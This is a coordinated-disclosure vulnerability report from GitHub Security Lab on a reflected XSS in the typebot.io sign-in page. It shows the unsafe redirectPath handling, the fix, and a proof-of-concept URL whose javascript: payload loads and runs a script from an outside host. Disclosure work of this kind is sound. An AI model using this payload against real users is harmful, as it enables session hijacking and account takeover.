# GitHub Security Lab (GHSL) Vulnerability Report, typebot.io: `GHSL-2024-040`

## Package

typebot.io

## Affected versions

v2.23.0

## Patched versions

 v2.24.0

## Description

# GitHub Security Lab (GHSL) Vulnerability Report, typebot.io: `GHSL-2024-040`

The [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [typebot.io](https://github.com/baptisteArno/typebot.io).

We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.

If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2024-040` as a reference). See also [this blog post](https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/) written by GitHub's Advisory Curation team which explains what CVEs and advisories are, why they are important to track vulnerabilities and keep downstream users informed, the CVE assigning process, and how they are used to keep open source software secure.

If you are *NOT* the correct point of contact for this report, please let us know!

## Summary

A reflected cross-site scripting (XSS) in the sign-in page of typebot.io may allow an attacker to hijack a user's account.

## Project

typebot.io

## Tested Version

[v2.23.0](https://github.com/baptisteArno/typebot.io/releases/tag/v2.23.0)

## Details

### Reflected XSS in `SignInForm.tsx` (`GHSL-2024-040`)

The sign-in page takes the [`redirectPath`](https://github.com/baptisteArno/typebot.io/blob/v2.23.0/apps/builder/src/features/auth/components/SignInForm.tsx#L35) parameter from the URL. If a user clicks on a link where the `redirectPath` parameter has a javascript scheme, the attacker that crafted the link may be able to execute arbitrary JavaScript with the privileges of the user.

```
export const SignInForm = ({
  defaultEmail,
}: Props & HTMLChakraProps<'form'>) => {
  const { t } = useTranslate()
  const router = useRouter()
  const { status } = useSession()
  const [authLoading, setAuthLoading] = useState(false)
  const [isLoadingProviders, setIsLoadingProviders] = useState(true)

  const [emailValue, setEmailValue] = useState(defaultEmail ?? '')
  const [isMagicLinkSent, setIsMagicLinkSent] = useState(false)

  const { showToast } = useToast()
  const [providers, setProviders] =
    useState<
      Record<LiteralUnion<BuiltInProviderType, string>, ClientSafeProvider>
    >()

  const hasNoAuthProvider =
    !isLoadingProviders && Object.keys(providers ?? {}).length === 0

  useEffect(() => {
    if (status === 'authenticated') {
      router.replace(router.query.redirectPath?.toString() ?? '/typebots')        <------ url redirected to query parameter
      return
    }
```

This vulnerability was found with the help of CodeQL's [Reflected XSS Query](https://codeql.github.com/codeql-query-help/javascript/js-xss/)

#### Impact

This issue may lead to `Account Takeover`.

#### Remediation

Create an allowlist of approved domains that can be directed to. In this case, ensure that the redirect is to the current domain.

#### Proof of Concept

The following link will grab a javascript file from localhost and execute it in the context of the current domain. An attacker can use this payload to grab javascript from his host and execute in the domain of the victim.

```
https://app.typebot.io/signin?redirectPath=javascript:var%20script%20=%20document.createElement(%27script%27);script.src%20=%20%27http://127.0.0.1:8765/alert.js%27;%20document.head.appendChild(script);#//

```
## GitHub Security Advisories

We recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).

## Credit

This issue was discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-040` in any communication regarding this issue.

## Disclosure Policy

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
